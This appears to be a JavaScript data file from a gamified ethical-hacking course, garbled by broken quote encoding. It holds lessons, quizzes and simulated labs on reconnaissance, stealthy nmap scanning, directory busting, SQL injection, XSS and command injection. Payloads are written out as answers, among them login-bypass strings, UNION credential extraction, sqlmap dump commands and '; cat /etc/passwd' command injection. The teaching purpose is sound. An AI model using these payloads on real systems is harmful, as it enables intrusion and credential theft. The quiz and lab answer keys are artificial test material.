{type:â€œteachâ€,text:â€œBig companies have hidden subdomains: dev.target.com, staging.target.com, admin.target.com. These side doors are often less secured \u2014 forgot to add authentication, running debug mode, or using old vulnerable software.â€},
{type:â€œhackâ€,story:â€œNovaTechâ€™s main site is locked down tight. But companies always have side doors \u2014 dev servers, staging environments, forgotten test sites. Find them.â€,q:â€œEnumerate novatech.comâ€™s subdomains.â€,a:[â€œsubfinder -d novatech.comâ€,â€œsubfinder -d target.comâ€,â€œamass enum -d novatech.comâ€,â€œamass enum -d target.comâ€],output:â€œnovatech.com\nwww.novatech.com\nmail.novatech.com\napi.novatech.com\ndev.novatech.com        \u2190 \uD83D\uDEA8\nstaging.novatech.com    \u2190 \uD83D\uDEA8\nlegacy.novatech.com     \u2190 \uD83D\uDEA8\njira.novatech.com\nvpn.novatech.com\n\n9 subdomains found.â€,success:â€œdev, staging, and legacy are HIGH VALUE targets! These often have weaker security than the main site.â€,why:â€œsubfinder queries public databases and certificate transparency logs. Never touches the target directly.â€,quickCmds:[â€œsubfinder -d novatech.comâ€]},
{type:â€œtfâ€,q:â€œSubdomain enumeration is passive recon.â€,a:true,why:â€œsubfinder queries public databases, never touching the target directly.â€},
]},
{id:â€œu5labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Recon Targetâ€,rounds:[
{type:â€œlabâ€,title:â€œRecon Targetâ€,objective:â€œGather intel on SecureBank Corp without touching their servers.â€,banner:â€œTarget: SecureBank Corp (securebank.com)\nPassive recon only \u2014 do NOT scan their servers.\nâ€,steps:[
{hint:â€œLook up who registered the domain.â€,accept:[â€œwhois securebank.comâ€,â€œ~whoisâ€],output:â€œRegistrant: John Smith\nEmail: admin@securebank.com\nRegistrar: GoDaddy\nCreated: 2019-03-15â€,successMsg:â€œFound the adminâ€™s name and email!â€,example:â€œwhois securebank.comâ€,quickCmds:[â€œwhois securebank.comâ€]},
{hint:â€œCheck DNS records for their IP.â€,accept:[â€œdig securebank.comâ€,â€œnslookup securebank.comâ€,â€œ~digâ€,â€œ~nslookupâ€],output:â€œsecurebank.com.  A     104.21.56.78\nsecurebank.com.  MX    mail.securebank.com\nsecurebank.com.  TXT   v=spf1 include:_spf.google.comâ€,successMsg:â€œGot their IP and mail server!â€,example:â€œdig securebank.comâ€,quickCmds:[â€œdig securebank.comâ€]},
{hint:â€œFind subdomains.â€,accept:[â€œsubfinder -d securebank.comâ€,â€œ~subfinderâ€,â€œ~amassâ€],output:â€œsecurebank.com\nwww.securebank.com\napi.securebank.com\ndev.securebank.com\nstaging.securebank.com\nmail.securebank.comâ€,successMsg:â€œFound dev and staging subdomains! These are often less secure.â€,example:â€œsubfinder -d securebank.comâ€,quickCmds:[â€œsubfinder -d securebank.comâ€]},
{hint:â€œSearch Google for exposed files.â€,accept:[â€œ~site:securebankâ€,â€œ~filetypeâ€,â€œsite:securebank.com filetype:pdfâ€],output:â€œResults:\n- securebank.com/docs/employee-handbook.pdf\n- securebank.com/reports/q3-financials.pdf\n- securebank.com/backup/db-schema.pdfâ€,successMsg:â€œExposed documents including a database schema! All without touching their servers.â€,example:â€œsite:securebank.com filetype:pdfâ€,quickCmds:[â€œsite:securebank.com filetype:pdfâ€]}
]}
]},
{id:â€œu5mâ€,title:â€\uD83C\uDFC6 Recon Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œFind PDFs on a target via Google:â€,a:[â€œsite:target.com filetype:pdfâ€,â€œfiletype:pdf site:target.comâ€],why:â€œGoogle dorking finds exposed documents.â€},
{type:â€œtypeâ€,q:â€œLook up domain registration:â€,a:[â€œwhois target.comâ€,â€œwhois securevault.comâ€,â€œwhois securebank.comâ€],why:â€œWHOIS reveals the domain owner.â€},
{type:â€œtypeâ€,q:â€œFind subdomains:â€,a:[â€œsubfinder -d target.comâ€,â€œamass enum -d target.comâ€],why:â€œSubdomains are often less secured.â€},
{type:â€œpickâ€,q:â€œWhich DNS record maps domain to IP?â€,opts:[â€œA recordâ€,â€œMX recordâ€,â€œTXT recordâ€,â€œCNAMEâ€],a:â€œA recordâ€,why:â€œA records map names to IPv4 addresses.â€},
]},
]},

// â€“â€“ UNIT 6: NMAP â€“â€“
{id:â€œu6â€,title:â€œNmap Scanningâ€,desc:â€œThe #1 tool \u2014 find open ports and servicesâ€,levels:[
{id:â€œu6l1â€,title:â€œNmap Basicsâ€,rounds:[
{type:â€œteachâ€,text:â€œYouâ€™ve got a target IP: 10.10.10.88. Time to scan it with nmap \u2014 your radar. It sends packets to every port and listens for responses. Open port = a door you might be able to walk through.â€},
{type:â€œtypeâ€,q:â€\uD83D\uDCE1 Scan the targetâ€™s most common ports:â€,a:[â€œnmap 10.10.10.88â€,â€œnmap 10.10.10.5â€,â€œnmap target.comâ€],why:â€œDefault nmap scans the top 1000 ports. Fast first look.â€},
{type:â€œscenarioâ€,situation:â€œYour quick scan found ports 22, 80, and 443. But the client says they also run a custom service on a high port.â€,q:â€œWhat scan would catch it?â€,opts:[â€œnmap -p- (all 65535 ports)â€,â€œnmap again (same scan)â€,â€œnmap -sU (UDP only)â€,â€œnmap â€“script=vulnâ€],a:â€œnmap -p- (all 65535 ports)â€,why:â€-p- scans every single port. Slower, but catches services hiding on unusual ports.â€},
{type:â€œtypeâ€,q:â€\uD83D\uDCE1 Full scan \u2014 every port:â€,a:[â€œnmap -p- 10.10.10.88â€,â€œnmap -p- target.comâ€,â€œnmap -p- 10.10.10.5â€],why:â€-p- means all 65535 ports. Essential for thorough enumeration.â€},
]},
{id:â€œu6l2â€,title:â€œService & OS Detectionâ€,rounds:[
{type:â€œteachâ€,text:â€œBasic nmap says a port is open. -sV tells you WHAT software and version (e.g. â€˜Apache 2.4.41â€™). -O guesses the OS. -sC runs default info-gathering scripts.â€},
{type:â€œbuildâ€,q:â€œBuild a detailed scan (all ports + version detection + OS guess):â€,parts:[â€œnmapâ€,â€-sVâ€,â€-Oâ€,â€-p-â€,â€œ10.10.10.5â€],answer:[â€œnmapâ€,â€-sVâ€,â€-Oâ€,â€-p-â€,â€œ10.10.10.5â€],why:â€-sV = detect software versions. -O = guess OS. -p- = all 65535 ports.â€},
{type:â€œteachâ€,text:â€œnmap has built-in vulnerability scanners called scripts. â€“script=vuln runs all of them against the target. It checks for known security holes in the software it finds.â€},
{type:â€œhackâ€,story:â€œYour basic scan found port 80 (web server) open. Now run nmapâ€™s vulnerability scripts to check if it has any known security holes.â€,q:â€œScan port 80 for vulnerabilities. (Hint: nmap â€“script=vuln)â€,a:[â€œnmap â€“script=vuln 10.10.10.5â€,â€œnmap â€“script vuln targetâ€,â€œnmap â€“script=vuln -p 80 10.10.10.5â€],output:â€œPORT   STATE SERVICE\n80/tcp open  http\n| http-sql-injection: Possible SQLi in /login.php\n| http-enum: /admin/ /backup/ /phpmyadmin/\n| http-csrf: Possible CSRF in /settings\n\n3 potential vulnerabilities found!â€,success:â€œSQL injection, exposed directories, AND a CSRF issue! Multiple attack paths.â€,why:â€â€“script=vuln checks for known vulnerabilities. This saves hours of manual testing.â€,quickCmds:[â€œnmap â€“script=vuln 10.10.10.5â€]},
]},
{id:â€œu6l3â€,title:â€œScan Types & Stealthâ€,rounds:[
{type:â€œteachâ€,text:â€œnmap scan styles: -sS (SYN scan) is stealthy \u2014 starts a connection but hangs up before finishing. -sT completes the full connection (louder). -sU scans UDP ports. -sn just checks whoâ€™s online.â€},
{type:â€œteachâ€,text:â€œSpeed control: -T3 is normal speed, -T4 is aggressive (faster), -T5 is â€˜insaneâ€™ (fastest but might miss things or crash services). For a stealthy fast scan of every port, combine -sS -T4 -p-.â€},
{type:â€œpickâ€,q:â€œWhich scan type is hardest for the target to detect?â€,opts:[â€-sS (SYN scan)â€,â€-sT (TCP connect)â€,â€-sU (UDP scan)â€,â€-sn (ping scan)â€],a:â€-sS (SYN scan)â€,why:â€œSYN scan starts the connection but never finishes it, making it harder for security tools to log.â€},
{type:â€œhackâ€,story:â€œThe target has an intrusion detection system watching for scans. You need to scan all ports as quietly as possible, but still fast enough to finish today.â€,q:â€œRun a fast, stealthy scan of all ports. (Hint: -sS -T4 -p-)â€,a:[â€œnmap -sS -T4 -p- 10.10.10.5â€,â€œnmap -sS -p- -T4 targetâ€,â€œnmap -sS -T4 -p- targetâ€],output:â€œNmap scan report for 10.10.10.5\nPORT      STATE SERVICE\n22/tcp    open  ssh\n80/tcp    open  http\n443/tcp   open  https\n8443/tcp  open  https-alt\n9090/tcp  open  zeus-admin\n\n5 ports found. Scan completed in 38 seconds.â€,success:â€œFound a hidden admin panel on port 9090 that a basic scan would have missed!â€,why:â€-sS = stealth. -T4 = fast. -p- = all ports. The perfect combination for thorough scanning.â€,quickCmds:[â€œnmap -sS -T4 -p- 10.10.10.5â€]},
]},
{id:â€œu6labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Scan the Bankâ€,rounds:[
{type:â€œlabâ€,title:â€œScan the Bankâ€,objective:â€œEnumerate SecureBankâ€™s server at 10.10.10.88.â€,banner:â€œTarget: SecureBank \u2014 10.10.10.88\nScope: Full port scan authorized\nâ€,steps:[
{hint:â€œCheck if the target is alive.â€,accept:[â€œping 10.10.10.88â€,â€œ~pingâ€],output:â€œ64 bytes from 10.10.10.88: icmp_seq=1 ttl=63\n4 packets, 0% lossâ€,successMsg:â€œTarget is alive!â€,example:â€œping 10.10.10.88â€,quickCmds:[â€œping 10.10.10.88â€]},
{hint:â€œFull port scan with service detection.â€,accept:[â€œ~nmap -sVâ€,â€œ~nmap -p-â€,â€œnmap -sV -p- 10.10.10.88â€],output:â€œPORT     STATE SERVICE    VERSION\n22/tcp   open  ssh        OpenSSH 7.6p1\n80/tcp   open  http       Apache 2.4.29\n3306/tcp open  mysql      MySQL 5.7.32\n8080/tcp open  http-proxy Squid 3.5.27â€,successMsg:â€œ4 open ports! SSH, HTTP, MySQL, and a proxy.â€,example:â€œnmap -sV -p- 10.10.10.88â€,quickCmds:[â€œnmap -sV -p- 10.10.10.88â€]},
{hint:â€œRun vuln scripts on the web server.â€,accept:[â€œ~nmap â€“scriptâ€,â€œnmap â€“script=vuln -p 80 10.10.10.88â€],output:â€| http-sql-injection: Possible SQLi in /login.php\n| http-enum: /admin/ /backup/ /phpmyadmin/â€,successMsg:â€œFound SQL injection and exposed directories!â€,example:â€œnmap â€“script=vuln -p 80 10.10.10.88â€,quickCmds:[â€œnmap â€“script=vuln -p 80 10.10.10.88â€]}
]}
]},
{id:â€œu6mâ€,title:â€\uD83C\uDFC6 Nmap Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œScan all ports with version detection:â€,a:[â€œnmap -sV -p- 10.10.10.5â€,â€œnmap -p- -sV targetâ€],why:â€œComplete enumeration.â€},
{type:â€œpickâ€,q:â€œWhich flag detects service versions?â€,opts:[â€-sVâ€,â€-sSâ€,â€-Oâ€,â€-p-â€],a:â€-sVâ€,why:â€-sV probes ports for software and version.â€},
{type:â€œscenarioâ€,situation:â€œYour nmap shows port 3306 (MySQL) open to the internet. Your scope only covers web app testing.â€,q:â€œWhat do you do?â€,opts:[â€œNote it in your reportâ€,â€œDump the databaseâ€,â€œIgnore itâ€,â€œRun sqlmap on itâ€],a:â€œNote it in your reportâ€,why:â€œExposed DB port is worth reporting even if exploiting it is outside scope.â€},
{type:â€œpickâ€,q:â€œStealthiest scan?â€,opts:[â€-sSâ€,â€-sTâ€,â€-sUâ€,â€-sAâ€],a:â€-sSâ€,why:â€œSYN scan never completes the handshake.â€},
]},
]},

// â€“â€“ UNIT 7: WEB RECON â€“â€“
{id:â€œu7â€,title:â€œWeb Reconâ€,desc:â€œMap web apps before attackingâ€,levels:[
{id:â€œu7l1â€,title:â€œHTTP Basicsâ€,rounds:[
{type:â€œteachâ€,text:â€œHTTP methods: GET = request page. POST = send data. PUT = update. DELETE = remove. Status codes: 200=OK, 301=redirect, 403=forbidden (exists!), 404=not found, 500=server error.â€},
{type:â€œmatchâ€,q:â€œMatch HTTP method:â€,pairs:[[â€œGETâ€,â€œRequest dataâ€],[â€œPOSTâ€,â€œSend dataâ€],[â€œPUTâ€,â€œUpdateâ€],[â€œDELETEâ€,â€œRemoveâ€]],why:â€œUnderstanding HTTP is fundamental to web hacking.â€},
{type:â€œpickâ€,q:â€œA 403 response means:â€,opts:[â€œExists but access deniedâ€,â€œNot foundâ€,â€œServer crashedâ€,â€œNeed to loginâ€],a:â€œExists but access deniedâ€,why:â€œ403 confirms the resource exists. Useful intel.â€},
]},
{id:â€œu7l2â€,title:â€œDirectory Bustingâ€,rounds:[
{type:â€œteachâ€,text:â€œWebsites hide pages that arenâ€™t linked: /admin, /backup, /.env. gobuster tries thousands of common paths from a wordlist to find them. curl downloads raw page text. robots.txt tells Google what NOT to index \u2014 which tells hackers exactly where the good stuff is.â€},
{type:â€œhackâ€,story:â€œThe targetâ€™s homepage looks clean, but there could be hidden admin panels, backup files, or config files. Run gobuster to try thousands of common paths.â€,q:â€œScan for hidden directories.â€,a:[â€œgobuster dir -u http://target.com -w /usr/share/wordlists/common.txtâ€,â€œgobuster dir -u http://target.com -w common.txtâ€,â€œdirsearch -u http://target.comâ€],output:â€===============================================\nGobuster v3.6 \u2014 directory brute-force\n===============================================\n\n/admin/          (Status: 403) [Size: 274]\n/backup/         (Status: 200) [Size: 1205]\n/config.php      (Status: 403) [Size: 274]\n/.env            (Status: 200) [Size: 340]\n/phpmyadmin/     (Status: 200) [Size: 8823]\n/robots.txt      (Status: 200) [Size: 156]\n\n6 results found!â€,success:â€œAdmin panel, backup folder, exposed .env file, AND phpMyAdmin! Multiple attack vectors.â€,why:â€œgobuster tries paths from a wordlist against the target. 200 = accessible, 403 = exists but blocked.â€,quickCmds:[â€œgobuster dir -u http://target.com -w common.txtâ€]},
{type:â€œhackâ€,story:â€œrobots.txt tells search engines what NOT to index. But it also tells hackers exactly where the interesting stuff is.â€,q:â€œCheck what theyâ€™re trying to hide.â€,a:[â€œcurl http://target.com/robots.txtâ€,â€œcurl target.com/robots.txtâ€],output:â€œUser-agent: *\nDisallow: /admin/\nDisallow: /api/internal/\nDisallow: /backup/database.sql\nDisallow: /debug/\n\nSitemap: http://target.com/sitemap.xmlâ€,success:â€œThey accidentally published a roadmap to their most sensitive paths!â€,why:â€œrobots.txt is meant for search engines but attackers read it too. Always check it first.â€},
]},
{id:â€œu7l3â€,title:â€œBurp Suiteâ€,rounds:[
{type:â€œteachâ€,text:â€œBurp Suite sits between browser and website, letting you see and change EVERY request. Proxy = intercept. Repeater = modify and resend. Intruder = try thousands of values.â€},
{type:â€œmatchâ€,q:â€œMatch Burp tool:â€,pairs:[[â€œProxyâ€,â€œIntercept requestsâ€],[â€œRepeaterâ€,â€œModify/resendâ€],[â€œIntruderâ€,â€œAutomated attacksâ€],[â€œDecoderâ€,â€œEncode/decodeâ€]],why:â€œEach module serves a different purpose.â€},
{type:â€œpickâ€,q:â€œBurpâ€™s Repeater is for:â€,opts:[â€œModifying and resending requestsâ€,â€œScanning for vulnsâ€,â€œBrute-forcingâ€,â€œEncoding textâ€],a:â€œModifying and resending requestsâ€,why:â€œRepeater lets you tweak and replay HTTP requests.â€},
]},
{id:â€œu7labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Web Enumâ€,rounds:[
{type:â€œlabâ€,title:â€œWeb Enumâ€,objective:â€œEnumerate a web server at 10.10.10.88 port 80.â€,banner:â€œTarget: http://10.10.10.88\nWeb enumeration authorized.\nâ€,steps:[
{hint:â€œCheck robots.txt for hidden paths.â€,accept:[â€œcurl http://10.10.10.88/robots.txtâ€,â€œ~curlâ€,â€œ~robotsâ€],output:â€œUser-agent: *\nDisallow: /admin/\nDisallow: /backup/db_dump.sql\nDisallow: /internal/â€,successMsg:â€œFound hidden paths including a database dump!â€,example:â€œcurl http://10.10.10.88/robots.txtâ€,quickCmds:[â€œcurl http://10.10.10.88/robots.txtâ€]},
{hint:â€œRun directory busting to find more.â€,accept:[â€œ~gobusterâ€,â€œ~dirsearchâ€,â€œ~feroxbusterâ€,â€œgobuster dir -u http://10.10.10.88 -w common.txtâ€],output:â€/admin/       (Status: 403)\n/backup/      (Status: 200)\n/login.php    (Status: 200)\n/config.php   (Status: 403)\n/phpmyadmin/  (Status: 200)â€,successMsg:â€œFound admin panel, backup dir, login page, and phpMyAdmin!â€,example:â€œgobuster dir -u http://10.10.10.88 -w common.txtâ€,quickCmds:[â€œgobuster dir -u http://10.10.10.88 -w common.txtâ€]},
{hint:â€œDownload the exposed database dump.â€,accept:[â€œ~curlâ€,â€œ~wgetâ€,â€œcurl http://10.10.10.88/backup/db_dump.sqlâ€],output:â€â€“ MySQL dump\nINSERT INTO users VALUES (1,â€˜adminâ€™,â€˜5f4dcc3b5aa765d61d8327deb882cf99â€™);\nINSERT INTO users VALUES (2,â€˜jsmithâ€™,â€˜e99a18c428cb38d5f260853678922e03â€™);â€,successMsg:â€œGot password hashes! Critical finding for your report.â€,example:â€œcurl http://10.10.10.88/backup/db_dump.sqlâ€,quickCmds:[â€œcurl http://10.10.10.88/backup/db_dump.sqlâ€]}
]}
]},
{id:â€œu7mâ€,title:â€\uD83C\uDFC6 Web Recon Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œpickâ€,q:â€œHTTP 403 means:â€,opts:[â€œForbidden (but exists)â€,â€œNot foundâ€,â€œServer errorâ€,â€œRedirectâ€],a:â€œForbidden (but exists)â€,why:â€œ403 confirms the resource exists.â€},
{type:â€œtypeâ€,q:â€œScan for hidden directories:â€,a:[â€œgobuster dir -u http://target.com -w common.txtâ€,â€œgobuster dir -u http://target.com -w /usr/share/wordlists/common.txtâ€,â€œdirsearch -u http://target.comâ€,â€œdirsearch -u target.comâ€],why:â€œDirectory busting finds hidden pages.â€},
{type:â€œtypeâ€,q:â€œCheck robots.txt:â€,a:[â€œcurl http://target.com/robots.txtâ€,â€œcurl target.com/robots.txtâ€,â€œcurl robots.txtâ€],why:â€œReveals paths the admin tried to hide.â€},
{type:â€œmatchâ€,q:â€œMatch Burp tool:â€,pairs:[[â€œProxyâ€,â€œInterceptâ€],[â€œRepeaterâ€,â€œModify/resendâ€],[â€œIntruderâ€,â€œAutomateâ€]],why:â€œKnow your Burp Suite.â€},
]},
]},
]};

var SEC3 = {
id:â€œs3â€,title:â€œExploitationâ€,tier:â€œbasicâ€,icon:â€\u26A1â€,color:â€œvar(â€“red)â€,
desc:â€œSQL injection, XSS, password cracking, Metasploitâ€,
units:[
// â€“â€“ UNIT 8: SQL INJECTION â€“â€“
{id:â€œu8â€,title:â€œSQL Injectionâ€,desc:â€œTrick databases into giving up secretsâ€,levels:[
{id:â€œu8l1â€,title:â€œHow SQLi Worksâ€,rounds:[
{type:â€œteachâ€,text:â€œImagine a bank vault with a voice-activated lock. It asks â€˜Name?â€™ and â€˜Password?â€™ then checks its list. If you say adminâ€™â€“ the vault hears: â€˜Find admin and IGNORE the password.â€™ The â€“ comments out everything after it.â€},
{type:â€œhackâ€,story:â€œYouâ€™re testing CryptoVaultâ€™s login page. The form asks for username and password. Behind the scenes, it builds a database query with your input. Time to trick it.â€,q:â€œBreak the login \u2014 bypass the password check.â€,a:[â€œadminâ€™â€“â€,â€â€™ OR 1=1â€“â€,â€œadminâ€™ OR 1=1â€“â€],output:â€œSQL Query: SELECT * FROM users WHERE name=â€˜adminâ€™â€“â€™ AND pass=â€™â€¦â€™\n\n\u26A0\uFE0F Password check BYPASSED\n\nWelcome, admin!\nAccess Level: ADMINISTRATOR\nLast Login: 2024-01-14 03:42 AM\nBalance: $4,847,293.00â€,success:â€œYouâ€™re in as admin with full access! The bank account balance is visible. Critical vulnerability.â€,why:â€œThe â€™ breaks the string, â€“ comments out the password check. The database ignores everything after â€“.â€,quickCmds:[â€œadminâ€™â€“â€,â€â€™ OR 1=1â€“â€]},
{type:â€œpickâ€,q:â€œWhat does â€“ do in SQL?â€,opts:[â€œComments out the rest of the lineâ€,â€œDeletes the databaseâ€,â€œEncrypts the queryâ€,â€œRuns a second commandâ€],a:â€œComments out the rest of the lineâ€,why:â€â€“ makes SQL ignore everything after it, including password checks.â€},
]},
{id:â€œu8l2â€,title:â€œTesting & Automatingâ€,rounds:[
{type:â€œhackâ€,story:â€œBefore trying complex injections, you need to test if the input is vulnerable at all. The simplest test: add a single quote (â€™) to any input field. If you get a database error, itâ€™s vulnerable.â€,q:â€œTest if the search bar is injectable.â€,a:[â€â€™â€],output:â€œSQL Error: You have an error in your SQL syntax;\ncheck the manual near â€˜â€™â€™ at line 1\n\nServer: MySQL 5.7.32\nFile: /var/www/search.php line 47\n\n\uD83D\uDEA8 Database ERROR exposed!â€,success:â€œSQL error with version info leaked! This is 100% vulnerable AND theyâ€™re exposing error details.â€,why:â€œA single quote breaks SQL syntax. If you see a database error, injection is possible.â€,quickCmds:[â€â€™â€]},
{type:â€œhackâ€,story:â€œManual injection worked. Now bring in the big guns \u2014 sqlmap automates finding injection points, extracting databases, tables, and dumping all data.â€,q:â€œUnleash sqlmap on the vulnerable search page.â€,a:[â€œsqlmap -u â€˜http://target/search?q=1â€™ â€“dbsâ€,â€œsqlmap -u http://target/page?id=1 â€“dbsâ€,â€œsqlmap -u â€˜http://target/page?id=1â€™ â€“dbsâ€],output:â€[*] testing connectionâ€¦\n[*] testing for SQL injection on parameter â€˜qâ€™\n[+] parameter â€˜qâ€™ is VULNERABLE (MySQL)\n\navailable databases:\n[*] information_schema\n[*] cryptovault_prod\n[*] cryptovault_backup\n[*] mysql\n\n4 databases found!â€,success:â€œFound the production AND backup databases! sqlmap did in seconds what would take hours manually.â€,why:â€œsqlmap automates the entire SQLi process: detection, exploitation, and data extraction.â€,quickCmds:[â€œsqlmap -u â€˜http://target/search?q=1â€™ â€“dbsâ€]},
]},
{id:â€œu8l3â€,title:â€œUNION Injectionâ€,rounds:[
{type:â€œteachâ€,text:â€œUNION combines your query with the original. â€™ UNION SELECT username,password FROM usersâ€“ pulls credentials. First find column count with ORDER BY.â€},
{type:â€œtypeâ€,q:â€œExtract user data with UNION:â€,a:[â€â€™ UNION SELECT username,password FROM usersâ€“â€,â€â€™ UNION SELECT 1,2,3â€“â€],why:â€œUNION combines results from two queries.â€},
{type:â€œtfâ€,q:â€œsqlmap can only find basic SQL injection.â€,a:false,why:â€œsqlmap handles blind, time-based, UNION, stacked queries, and more.â€},
]},
{id:â€œu8labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Hack the Loginâ€,rounds:[
{type:â€œlabâ€,title:â€œHack the Loginâ€,objective:â€œExploit SQL injection on MegaCorpâ€™s login to extract credentials.â€,banner:â€œTarget: http://10.10.10.66/login.php\nâ€,steps:[
{hint:â€œTest if the login is vulnerable with a single quote.â€,accept:[â€â€™â€,â€~â€™â€],output:â€œSQL Error: syntax error near â€˜â€™â€™ at line 1â€,successMsg:â€œSQL error! Itâ€™s vulnerable.â€,example:â€â€™â€,quickCmds:[â€â€™â€]},
{hint:â€œBypass the login with SQL injection.â€,accept:[â€œadminâ€™â€“â€,â€œ~adminâ€™â€“â€,â€â€™ OR 1=1â€“â€],output:â€œWelcome, admin! Login successful.â€,successMsg:â€œYouâ€™re in! The â€“ commented out the password check.â€,example:â€œadminâ€™â€“â€,quickCmds:[â€œadminâ€™â€“â€,â€â€™ OR 1=1â€“â€]},
{hint:â€œUse sqlmap to dump everything.â€,accept:[â€œ~sqlmapâ€,â€œsqlmap -u â€˜http://10.10.10.66/login.phpâ€™ â€“dumpâ€],output:â€[*] cracking hashesâ€¦\nadmin  : password\njsmith : abc123\nbackup : adminâ€,successMsg:â€œAll credentials extracted! Critical vulnerability.â€,example:â€œsqlmap -u â€˜http://10.10.10.66/login.phpâ€™ â€“dumpâ€,quickCmds:[â€œsqlmap -u â€˜http://10.10.10.66/login.phpâ€™ â€“dumpâ€]}
]}
]},
{id:â€œu8mâ€,title:â€\uD83C\uDFC6 SQLi Masteryâ€,isCheckpoint:true,rounds:[
{type:â€œtypeâ€,q:â€œTest for SQL injection:â€,a:[â€â€™â€,â€â€™ OR 1=1â€“â€,â€œ1â€™ OR 1=1â€“â€,â€œor 1=1â€],why:â€œSingle quote tests for SQLi.â€},
{type:â€œtypeâ€,q:â€œBypass a login:â€,a:[â€œadminâ€™â€“â€,â€â€™ OR 1=1â€“â€,â€œadminâ€™ â€“â€,â€œadminâ€™ or 1=1â€“â€],why:â€œBreak query, comment out password.â€},
{type:â€œtypeâ€,q:â€œAutomate SQL injection:â€,a:[â€œsqlmap -u http://target/page?id=1 â€“dbsâ€,â€œsqlmap -u â€˜http://target/page?id=1â€™ â€“dbsâ€,â€œsqlmap -u target â€“dbsâ€],why:â€œsqlmap automates everything.â€},
{type:â€œpickâ€,q:â€â€“ in SQL injection:â€,opts:[â€œComments out the restâ€,â€œEncrypts dataâ€,â€œCreates a tableâ€,â€œDeletes recordsâ€],a:â€œComments out the restâ€,why:â€â€“ removes the password check.â€},
]},
]},

// â€“â€“ UNIT 9: XSS & WEB ATTACKS â€“â€“
{id:â€œu9â€,title:â€œXSS & Web Attacksâ€,desc:â€œInject code and steal sessionsâ€,levels:[
{id:â€œu9l1â€,title:â€œCross-Site Scriptingâ€,rounds:[
{type:â€œteachâ€,text:â€œXSS = planting a booby trap on a website. Your code runs in OTHER peopleâ€™s browsers. Stored XSS persists in the database (most dangerous). Reflected only works via a trick link.â€},
{type:â€œpickâ€,q:â€œMost dangerous XSS type?â€,opts:[â€œStoredâ€,â€œReflectedâ€,â€œDOM-basedâ€,â€œAll equalâ€],a:â€œStoredâ€,why:â€œStored XSS persists and affects every user who views the page.â€},
{type:â€œtfâ€,q:â€œXSS only works if the victim clicks a link.â€,a:false,why:â€œStored XSS triggers automatically for anyone viewing the infected page.â€},
]},
{id:â€œu9l2â€,title:â€œCommand Injectionâ€,rounds:[
{type:â€œteachâ€,text:â€œSome websites run system commands behind the scenes, like a â€˜pingâ€™ tool. If they donâ€™t filter your input, add a semicolon (;) to chain extra commands. Type 127.0.0.1; cat /etc/passwd and the server runs BOTH.â€},
{type:â€œhackâ€,story:â€œThis website has a â€˜pingâ€™ feature where you enter an IP address. Behind the scenes, the server runs: ping [your input]. Since they donâ€™t filter your input, you can sneak in extra commands after a semicolon.â€,q:â€œUse command injection to read /etc/passwd. (Hint: add ; cat /etc/passwd after an IP)â€,a:[â€œ127.0.0.1; cat /etc/passwdâ€,â€| cat /etc/passwdâ€,â€; cat /etc/passwdâ€],output:â€œPING 127.0.0.1: 64 bytes\nâ€”\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www\nadmin:x:1000:1000::/home/admin:/bin/bashâ€,success:â€œIt ran BOTH commands! You got the user list through a website input field.â€,why:â€œThe semicolon ; tells Linux to run a second command. The server ran ping AND cat.â€,quickCmds:[â€œ127.0.0.1; cat /etc/passwdâ€]},
{type:â€œteachâ€,text:â€œSSRF (Server-Side Request Forgery) tricks the server into visiting internal pages that YOU canâ€™t reach directly. Like asking a waiter to go to the VIP room and bring back whatâ€™s on the table. The server becomes your puppet to access hidden systems.â€},
]},
{id:â€œu9l3â€,title:â€œAttack Scenariosâ€,rounds:[
{type:â€œscenarioâ€,situation:â€œYou find a search bar on the target website. When you search for test, the URL becomes /search?q=test and your input appears in the page HTML.â€,q:â€œWhat vulnerability should you test for?â€,opts:[â€œReflected XSSâ€,â€œSQL Injectionâ€,â€œSSRFâ€,â€œBrute forceâ€],a:â€œReflected XSSâ€,why:â€œUser input reflected in HTML without sanitization = potential XSS.â€},
{type:â€œscenarioâ€,situation:â€œThe website has a â€˜pingâ€™ feature where you enter an IP and it shows ping results.â€,q:â€œWhat attack should you try?â€,opts:[â€œCommand injectionâ€,â€œXSSâ€,â€œSQL injectionâ€,â€œBrute forceâ€],a:â€œCommand injectionâ€,why:â€œIf it runs ping on your input, try adding ; or | to chain extra commands.â€},
{type:â€œpickâ€,q:â€œSSRF lets you:â€,opts:[â€œMake the server fetch internal resourcesâ€,â€œCrash the databaseâ€,â€œEncrypt trafficâ€,â€œScan portsâ€],a:â€œMake the server fetch internal resourcesâ€,why:â€œSSRF tricks the server into making internal requests.â€},
]},
{id:â€œu9labâ€,title:â€\uD83D\uDDA5\uFE0F Lab: Web Exploitsâ€,rounds:[
{type:â€œlabâ€,title:â€œWeb Exploitsâ€,objective:â€œFind and exploit vulnerabilities on MegaCorpâ€™s web app.â€,banner:â€œTarget: http://10.10.10.66\nWeb application testing authorized.\nâ€,steps:[
{hint:â€œTest the search bar for XSS.â€,accept:[â€œ~scriptâ€,â€œ~alertâ€,â€œ~xssâ€],output:â€œSearch results for: [popup appears!]\nThe page executed your JavaScript code!â€,successMsg:â€œXSS confirmed! The search bar doesnâ€™t sanitize input.â€,example:â€<script>alert(1)</script>â€,quickCmds:[â€<script>alert(1)</script>â€]},
{hint:â€œTest the ping feature for command injection.â€,accept:[â€œ127.0.0.1; whoamiâ€,â€~; whoamiâ€,â€~;whoamiâ€,â€~| whoamiâ€],output:â€œPING 127.0.0.1: 64 bytes\nâ€”\nwww-dataâ€,successMsg:â€œCommand injection! whoami ran on the server.â€,example:â€œ127.0.0.1; whoamiâ€,quickCmds:[â€œ127.0.0.1; whoamiâ€]},
{hint:â€œRead /etc/passwd through command injection.â€,accept:[â€~; cat /etc/passwdâ€,â€œ127.0.0.1; cat /etc/passwdâ€,â€œ~cat /etc/passwdâ€],output:â€œroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\nadmin:x:1000:1000::/home/admin:/bin/bashâ€,successMsg:â€œGot the user list! Two users with shell access: root and admin.â€,example:â€œ127.0.0.1; cat /etc/passwdâ€,quickCmds:[â€œ127.0.0.1; cat /etc/passwdâ€]}
]}
]},
